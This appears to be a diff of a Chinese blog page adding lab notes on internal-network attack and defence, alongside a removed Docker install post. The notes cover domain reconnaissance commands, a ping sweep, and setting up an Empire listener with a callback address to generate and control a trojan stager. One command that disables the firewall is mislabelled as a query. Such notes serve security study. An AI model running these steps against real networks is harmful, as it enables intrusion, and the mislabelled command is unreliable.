+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028143936663.png" alt="image-20201028143936663"></p>
+<p>给win10新建用户</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028144100009.png" alt="image-20201028144100009"></p>
+<h3 id="windows-10-设置"><a href="#windows-10-设置" class="headerlink" title="windows 10 设置"></a>windows 10 设置</h3><h4 id="设置DNS"><a href="#设置DNS" class="headerlink" title="设置DNS"></a>设置DNS</h4><p>设置DNS服务器为域内DNS服务器地址</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028144704365.png" alt="image-20201028144704365"></p>
+<p>可PING通域名</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028144749821.png" alt="image-20201028144749821"></p>
+<h4 id="将服务器加入域"><a href="#将服务器加入域" class="headerlink" title="将服务器加入域"></a>将服务器加入域</h4><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028145027295.png" alt="image-20201028145027295"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028145138656.png" alt="image-20201028145138656"></p>
+<p>之后重启服务器生效</p>
+<h3 id="Linux服务器加入域（kali）"><a href="#Linux服务器加入域（kali）" class="headerlink" title="Linux服务器加入域（kali）"></a>Linux服务器加入域（kali）</h3><p>信息暂缺</p>
+<h1 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h1><h2 id="自动搜集"><a href="#自动搜集" class="headerlink" title="自动搜集"></a>自动搜集</h2><p>脚本下载地址:<a href>wmic</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic_info.bat</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="手动搜集"><a href="#手动搜集" class="headerlink" title="手动搜集"></a>手动搜集</h2><h3 id="系统基本信息查询"><a href="#系统基本信息查询" class="headerlink" title="系统基本信息查询"></a>系统基本信息查询</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$systeminfo</span>                                                      </span><br><span class="line">                                                //操作系统信息，补丁列表                   <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$echo</span> %PROCESSOR_ARCHITECTURE%                                </span><br><span class="line">                                                //查看系统体系结构 x64,x32                <span class="built_in">PS</span>不能用，CMD能用</span><br><span class="line"><span class="variable">$wmic</span> product get name,version                                </span><br><span class="line">                                                //查看安装的软件及版本和路径（软件多，会略慢） <span class="built_in">PS</span>能用，CMD能用    </span><br><span class="line"><span class="variable">$</span>********</span><br><span class="line">                                                //利用<span class="built_in">PS</span>搜集软件的版本信息</span><br><span class="line"><span class="variable">$wmic</span> service list brief                        </span><br><span class="line">                                                //查询本机服务信息                           <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$tasklist</span>                                        </span><br><span class="line">                                                //查询进程列表                            <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$wmic</span> <span class="keyword">process</span> listbrief                                                </span><br><span class="line">                                                //查询进程列表                            <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$wmic</span> startup get command,caption</span><br><span class="line">                                                //查询启动信息                            <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$schtasks</span> /query /fo LIST /V                                                 </span><br><span class="line">                                                //查看计划任务                            <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$net</span> user                                                 </span><br><span class="line">                                                //查询用户列表                            <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$net</span> localgroup administrators</span><br><span class="line">                                                //获取本地管理员信息                       <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$query</span> user || qwinsta                                                </span><br><span class="line">                                                //查询在线用户                            <span class="built_in">PS</span>不能用，CMD能用</span><br><span class="line"><span class="variable">$net</span> session                                                </span><br><span class="line">                                                //列出会话                                 <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$net</span> share                                                 </span><br><span class="line">                                                //查询本机共享列表                          <span class="built_in">PS</span>能用，CMD能用</span><br><span class="line"><span class="variable">$route</span> print                                    </span><br><span class="line">                                                //查询路由表</span><br><span class="line"><span class="variable">$arp</span> <span class="literal">-a</span> </span><br><span class="line">                                                //查询所有可用接口的的缓存表</span><br><span class="line"><span class="variable">$netsh</span> firewall <span class="built_in">set</span> opmode disable</span><br><span class="line">                                                //查询防火墙相关配置</span><br><span class="line"><span class="variable">$reg</span> query <span class="string">&quot;HKEY_current_user\software\microsoft\windows\currentversion\internet settings&quot;</span></span><br><span class="line">                                                //查看代理配置情况</span><br><span class="line"><span class="variable">$reg</span> query <span class="string">&quot;HKEY_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp&quot;</span> /v portnumber</span><br><span class="line">                                                //查看远程端口</span><br><span class="line"><span class="variable">$reg</span> add <span class="string">&quot;HKEY_local_machine\system\currentcontrolset\control\terminal server&quot;</span> /v fsinglesessionperuser /t reg_dword /d <span class="number">0</span> /f                                                </span><br><span class="line">                                                </span><br><span class="line">                                                </span><br><span class="line">                                                </span><br><span class="line">                                                </span><br></pre></td></tr></table></figure>
+
+<h3 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whoami</span>   查看当前权限</span><br><span class="line"><span class="variable">$whoami</span> /all  可以得到当前域的SID</span><br><span class="line"><span class="variable">$net</span> user XXX /domain 可以获得特定用户的详细信息</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Empire信息收集"><a href="#Empire信息收集" class="headerlink" title="Empire信息收集"></a>Empire信息收集</h2><h3 id="安装Empire"><a href="#安装Empire" class="headerlink" title="安装Empire"></a>安装Empire</h3><p>安装命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire.git</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">每次pip后都需要 sudo ./reset.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named xlutils.copy</span></span><br><span class="line">pip install xlutils</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named Crypto.Cipher</span></span><br><span class="line">pip install pycrypto</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named pyminifier</span></span><br><span class="line">pip install pyminifier</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="安装M2Crypto"><a href="#安装M2Crypto" class="headerlink" title="安装M2Crypto"></a>安装M2Crypto</h4><p>若要<em>安装</em>M2Crypto，您必须能够根据 Python 和 OpenSSL 标头/库编译和链接 C 源。例如，在基于 Debian 的系统中，需要以下包：</p>
+<ul>
+<li><code>build-essential</code></li>
+<li><code>python3-dev</code>和/或<code>python-dev</code></li>
+<li><code>libssl-dev</code></li>
+<li><code>swig 2.0.4</code>或较新的（安装也可以在一些</li>
+</ul>
+<p>具有 swig v1.*的特定旧系统</p>
+<h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">agents            Jump to the Agents menu.</span><br><span class="line">creds             Add&#x2F;display credentials to&#x2F;from the database.</span><br><span class="line">exit              Exit Empire</span><br><span class="line">help              Displays the help menu.</span><br><span class="line">interact          Interact with a particular agent.</span><br><span class="line">list              Lists active agents or listeners.</span><br><span class="line">listeners         Interact with active listeners.</span><br><span class="line">load              Loads Empire modules from a non-standard folder.</span><br><span class="line">plugin            Load a plugin file to extend Empire.</span><br><span class="line">plugins           List all available and active plugins.</span><br><span class="line">preobfuscate      Preobfuscate PowerShell module_source files</span><br><span class="line">reload            Reload one (or all) Empire modules.</span><br><span class="line">report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log</span><br><span class="line">reset             Reset a global option (e.g. IP whitelists).</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">searchmodule      Search Empire module names&#x2F;descriptions.</span><br><span class="line">set               Set a global option (e.g. IP whitelists).</span><br><span class="line">show              Show a global option (e.g. IP whitelists).</span><br><span class="line">usemodule         Use an Empire module.</span><br><span class="line">usestager         Use an Empire stager.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="监听使用"><a href="#监听使用" class="headerlink" title="监听使用"></a>监听使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">(Empire)&gt;</span><span class="bash"> listeners     <span class="comment"># 监听</span></span></span><br><span class="line">(Empire: listeners) &gt; uselistener http   #选择监听方式</span><br><span class="line">(Empire: listeners/http) &gt; info     #查看需要配置的选项</span><br><span class="line">(Empire: listeners/http) &gt; set Name backdoor    #设置监听名字</span><br><span class="line">(Empire: listeners/http) &gt; set Host http://192.168.80.131:4447             #设置木马反弹回连地址</span><br><span class="line">(Empire: listeners/http) &gt; set Port 4447 #设置本地监听端口</span><br><span class="line">(Empire: listeners/http) &gt; back #返回上层模块</span><br><span class="line">(Empire: listeners) &gt; usestager windows/launcher_bat backdoor  # 选择木马种类</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; info     #查看需要配置的 -----可以set OutFile 到你指定的目录（绝对路径）</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; execute  #执行生成木马</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; agents   #查看获取的代理会话</span><br><span class="line">(Empire: agents) &gt; rename HZFT7AX1 win7pro #更改会话名字</span><br><span class="line">(Empire: agents) &gt; interact win7pro    #和该会话交互</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>监听部分</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201101170327608.png" alt="image-20201101170327608"></p>
+<h3 id="木马生成部分"><a href="#木马生成部分" class="headerlink" title="木马生成部分"></a>木马生成部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201101171314995.png" alt="image-20201101171314995"></p>
+<h3 id="木马监听部分"><a href="#木马监听部分" class="headerlink" title="木马监听部分"></a>木马监听部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201101183922578.png" alt="image-20201101183922578"></p>
+<h3 id="会话交互"><a href="#会话交互" class="headerlink" title="会话交互"></a>会话交互</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename  E8FSHDVY win10  <span class="comment">#修改会话名称</span></span><br><span class="line"></span><br><span class="line">interact win10 <span class="comment">#进入会话交互</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201101184218822.png" alt="image-20201101184218822"></p>
+<h2 id="域内主机探测"><a href="#域内主机探测" class="headerlink" title="域内主机探测"></a>域内主机探测</h2><h1 id="判断当前域与权限"><a href="#判断当前域与权限" class="headerlink" title="判断当前域与权限"></a>判断当前域与权限</h1><h2 id="查看当前域权限"><a href="#查看当前域权限" class="headerlink" title="查看当前域权限"></a>查看当前域权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$net time &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201123152952254.png" alt="image-20201123152952254"></p>
+<p>通常由三种结果,</p>
+<ul>
+<li>存在域但当前用户不是域用户                     <pre><code>- 告警发生系统错误</code></pre>
+</li>
+<li>存在域,且当前用户为域用户         <pre><code>- 如截图,正常</code></pre>
+</li>
+<li>网络环境是工作组,不存在域<pre><code>- 报告找不到域服务器            </code></pre>
+</li>
+</ul>
+<h2 id="查看是否存在域"><a href="#查看是否存在域" class="headerlink" title="查看是否存在域"></a>查看是否存在域</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ipconfig</span> /all    <span class="comment">#可以查案网关IP地址，DNS的IP地址，域名，本机是否和DNS处于同一网段等信息．</span></span><br><span class="line"><span class="variable">$nslookup</span>        <span class="comment">#nslookup命令可以用来解析域名的IP地址,利用解析的来的IP地址判断域控制器及DNS服务器是否在同一主机上．</span></span><br><span class="line"><span class="variable">$systeminfo</span>     <span class="comment">#可以查看是否该主机是否在域内</span></span><br><span class="line"><span class="variable">$net</span> config workstation <span class="comment">#查询当前登录域及登陆用户信息</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201123152827263.png" alt="image-20201123152827263"></p>
+<h2 id="域内主机探测-1"><a href="#域内主机探测-1" class="headerlink" title="域内主机探测"></a>域内主机探测</h2><h3 id="Netscan"><a href="#Netscan" class="headerlink" title="Netscan"></a>Netscan</h3><p><a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html#download">下载地址</a></p>
+<blockquote>
+<p>NBTScan is a program for scanning IP networks for NetBIOS name information (similar to what the Windows nbtstat tool provides against single hosts). It sends a NetBIOS status query to each address in a supplied range and lists received information in human readable form. For each responded host it lists IP address, NetBIOS computer name, logged-in user name and MAC address. The original nbtscan was written by Alla Bezroutchko. Steve Friedl has written an alternate implementation. </p>
+</blockquote>
+<p>主机开启防火墙结果不准确,例如截图中缺少win10地址</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201123163346097.png" alt="image-20201123163346097"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201123163937110.png" alt="image-20201123163937110"></p>
+<h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>利用ICMP协议快速探测内网主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr <span class="string">&quot;TTL=&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>本质是使用SHELL语言批量执行Ping 命令查看主机开放情况。</p>
+</blockquote>
+<h2 id="检查域内主机端口"><a href="#检查域内主机端口" class="headerlink" title="检查域内主机端口"></a>检查域内主机端口</h2><h4 id="使用Telnet命令检测端口"><a href="#使用Telnet命令检测端口" class="headerlink" title="使用Telnet命令检测端口"></a>使用Telnet命令检测端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$telnet 192.168.1.1 22</span><br></pre></td></tr></table></figure>
+
+<h4 id="S扫描器"><a href="#S扫描器" class="headerlink" title="S扫描器"></a>S扫描器</h4><h4 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h4>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">内网，学习笔记，安全攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-习近平在网络安全和信息化工作座谈会上的讲话-（2016年4月19日）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -483,821 +1489,9 @@
 
 
   
-    <article id="post-docker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/docker/">docker</a>
-    </h1>
-  
-
-        
-        <a href="/2020/10/16/docker/" class="archive-article-date">
-  	<time datetime="2020-10-16T01:57:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
-
-<p>1、使用 sudo 或 root 权限登录 Centos。</p>
-<p>2、确保 yum 包更新到最新。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum update</span><br></pre></td></tr></table></figure>
-
-<p>3、执行 Docker 安装脚本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https:&#x2F;&#x2F;get.docker.com -o get-docker.sh </span><br><span class="line">$ sudo sh get-docker.sh</span><br></pre></td></tr></table></figure>
-
-<p>执行这个脚本会添加 docker.repo 源并安装 Docker。</p>
-<p>4、启动 Docker 进程。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl start docker</span><br></pre></td></tr></table></figure>
-
-<p>5、验证 docker 是否安装成功并在容器中执行一个测试的镜像。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run hello-world docker ps</span><br></pre></td></tr></table></figure>
-
-<p>到此，Docker 在 CentOS 系统的安装完成。</p>
-<h1 id="docker帮助列表"><a href="#docker帮助列表" class="headerlink" title="docker帮助列表"></a>docker帮助列表</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">Usage:  docker [OPTIONS] COMMAND</span><br><span class="line"></span><br><span class="line">A self-sufficient runtime for containers</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --config string      Location of client config files (default &quot;&#x2F;root&#x2F;.docker&quot;)</span><br><span class="line">  -c, --context string     Name of the context to use to connect to the daemon</span><br><span class="line">                           (overrides DOCKER_HOST env var and default context set with</span><br><span class="line">                           &quot;docker context use&quot;)</span><br><span class="line">  -D, --debug              Enable debug mode</span><br><span class="line">  -H, --host list          Daemon socket(s) to connect to</span><br><span class="line">  -l, --log-level string   Set the logging level</span><br><span class="line">                           (&quot;debug&quot;|&quot;info&quot;|&quot;warn&quot;|&quot;error&quot;|&quot;fatal&quot;) (default &quot;info&quot;)</span><br><span class="line">      --tls                Use TLS; implied by --tlsverify</span><br><span class="line">      --tlscacert string   Trust certs signed only by this CA (default</span><br><span class="line">                           &quot;&#x2F;root&#x2F;.docker&#x2F;ca.pem&quot;)</span><br><span class="line">      --tlscert string     Path to TLS certificate file (default &quot;&#x2F;root&#x2F;.docker&#x2F;cert.pem&quot;)</span><br><span class="line">      --tlskey string      Path to TLS key file (default &quot;&#x2F;root&#x2F;.docker&#x2F;key.pem&quot;)</span><br><span class="line">      --tlsverify          Use TLS and verify the remote</span><br><span class="line">  -v, --version            Print version information and quit</span><br><span class="line"></span><br><span class="line">Management Commands:</span><br><span class="line">  builder     Manage builds</span><br><span class="line">  config      Manage Docker configs</span><br><span class="line">  container   Manage containers</span><br><span class="line">  context     Manage contexts</span><br><span class="line">  engine      Manage the docker engine</span><br><span class="line">  image       Manage images</span><br><span class="line">  network     Manage networks</span><br><span class="line">  node        Manage Swarm nodes</span><br><span class="line">  plugin      Manage plugins</span><br><span class="line">  secret      Manage Docker secrets</span><br><span class="line">  service     Manage services</span><br><span class="line">  stack       Manage Docker stacks</span><br><span class="line">  swarm       Manage Swarm</span><br><span class="line">  system      Manage Docker</span><br><span class="line">  trust       Manage trust on Docker images</span><br><span class="line">  volume      Manage volumes</span><br><span class="line"></span><br><span class="line">Commands: </span><br><span class="line">  attach      Attach local standard input, output, and error streams to a running container  </span><br><span class="line">                将本地标准输入、输出和错误流附加到运行的容器</span><br><span class="line">  build       Build an image from a Dockerfile</span><br><span class="line">                从Dockerfile构建映像</span><br><span class="line">  commit      Create a new image from a container&#39;s changes</span><br><span class="line">              根据容器的更改创建新映像</span><br><span class="line">  cp          Copy files&#x2F;folders between a container and the local filesystem</span><br><span class="line">  </span><br><span class="line">  create      Create a new container</span><br><span class="line">  </span><br><span class="line">  diff        Inspect changes to files or directories on a container&#39;s filesystem</span><br><span class="line">  </span><br><span class="line">  events      Get real time events from the server</span><br><span class="line">  </span><br><span class="line">  exec        Run a command in a running container</span><br><span class="line">  export      Export a container&#39;s filesystem as a tar archive</span><br><span class="line">  history     Show the history of an image</span><br><span class="line">  images      List images</span><br><span class="line">  import      Import the contents from a tarball to create a filesystem image</span><br><span class="line">  info        Display system-wide information</span><br><span class="line">  inspect     Return low-level information on Docker objects</span><br><span class="line">  kill        Kill one or more running containers</span><br><span class="line">  load        Load an image from a tar archive or STDIN</span><br><span class="line">  login       Log in to a Docker registry</span><br><span class="line">  logout      Log out from a Docker registry</span><br><span class="line">  logs        Fetch the logs of a container</span><br><span class="line">  pause       Pause all processes within one or more containers</span><br><span class="line">  port        List port mappings or a specific mapping for the container</span><br><span class="line">  ps          List containers</span><br><span class="line">  pull        Pull an image or a repository from a registry</span><br><span class="line">  push        Push an image or a repository to a registry</span><br><span class="line">  rename      Rename a container</span><br><span class="line">  restart     Restart one or more containers</span><br><span class="line">  rm          Remove one or more containers</span><br><span class="line">  rmi         Remove one or more images</span><br><span class="line">  run         Run a command in a new container</span><br><span class="line">  save     